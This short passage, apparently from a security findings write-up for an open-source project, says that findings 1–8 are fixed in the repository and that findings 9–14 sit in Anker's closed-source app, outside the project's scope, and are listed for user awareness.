Findings 1–8 have been fixed in this repository. Findings 9–14 are in Anker's closed-source official app and are not in scope for this project to fix — they are documented here for user awareness.
